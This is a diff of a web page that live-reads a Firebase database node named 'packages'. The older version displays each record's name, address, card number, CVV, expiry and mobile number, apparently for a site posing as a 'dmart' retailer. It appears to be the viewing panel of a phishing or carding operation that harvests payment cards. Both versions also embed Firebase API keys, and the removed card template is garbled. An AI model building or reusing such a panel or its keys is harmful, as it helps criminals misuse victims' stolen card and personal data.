@@ -1,42 +1,57 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<style>
-.card{border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,.3);padding:16px;width:300px;margin:10px;}
-#cards{display:flex;flex-wrap:wrap;gap:16px}
-</style>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Firebase Realtime Database Viewer</title>
+  <meta charset="UTF-8">
+  <title>Realtime JSON View</title>
+  <style>
+    body {
+      font-family: monospace;
+      background: #111;
+      color: #00FF00;
+      padding: 20px;
+    }
+    pre {
+      background: #222;
+      padding: 15px;
+      border-radius: 8px;
+      overflow-x: auto;
+      max-height: 90vh;
+    }
+  </style>
 </head>
 <body>
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
-<script>
-const firebaseConfig = {
-  apiKey: "AIzaSyDxlxSBiCEFf0PtWKoCSsA6BcpibN85x-Y",
-  authDomain: "dmart-website-6c48c.firebaseapp.com",
-  databaseURL: "https://dmart-website-6c48c-default-rtdb.firebaseio.com",
-  projectId: "dmart-website-6c48c",
-  storageBucket: "dmart-website-6c48c.appspot.com",
-  messagingSenderId: "960037120520",
-  appId: "1:960037120520:web:952c932d345bca51d03fbd",
-  measurementId: "G-51BMQD6D13"
-};
-firebase.initializeApp(firebaseConfig);
-const database=firebase.database();
+
+<h2>Live Firebase JSON Data</h2>
+<pre id="output">{}</pre>
+
+<!-- Firebase -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+  import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+  // Your Firebase config (Company ki taraf se values)
+  const firebaseConfig = {
+    apiKey: "AIzaSyDRhaZ13pSKBFg9JH2ATbekTVizRk0uAcE",
+    authDomain: "companykitarfse.firebaseapp.com",
+    projectId: "companykitarfse",
+    storageBucket: "companykitarfse.firebasestorage.app",
+    messagingSenderId: "217162599533",
+    appId: "1:217162599533:android:522a95555f758f62748364"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  // Live listener
+  const output = document.getElementById("output");
+  const packagesRef = ref(db, "packages");
+
+  onValue(packagesRef, (snapshot) => {
+    const data = snapshot.val();
+    output.innerText = JSON.stringify(data, null, 2); // pretty print
+  });
 </script>
-  <div id="cards" style="display:flex;flex-wrap:wrap;gap:16px"></div>
-<script>
-database.ref('packages').on('value',snap=>{
- const cards= snap.val();
- let html='';
- for(const k in cards){const c=cards[k];html+=`<div class='card' #ccc;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.2);padding:16px;width:300px'>
- <h3>${c.fullName}</h3>
- <p>${c.address}</p>
- <p><strong>Address:</strong> ${c.address}</p><p><strong>Card:</strong> ${c.cardNumber}</p><p><strong>CVV:</strong> ${c.cvv}</p><p><strong>Expiry:</strong> ${c.expiryMM}/${c.expiryYY}</p><p><strong>Method:</strong> ${c.paymentMethod}</p><p><strong>City:</strong> ${c.city}</p><p><strong>State:</strong> ${c.state}</p><p><strong>Pincode:</strong> ${c.pincode}</p><p><strong>Mobile:</strong> ${c.mobileNumber}</p></strong> ${c.address}</p><p><strong>Card:</strong> ${c.cardNumber}</p><p><strong>City:</strong> ${c.city}</p><p><strong>Mobile:</strong> ${c.mobileNumber}</p>
- </div>`;} document.getElementById('cards').innerHTML=html;
-});
-</script>
+
 </body>
 </html>
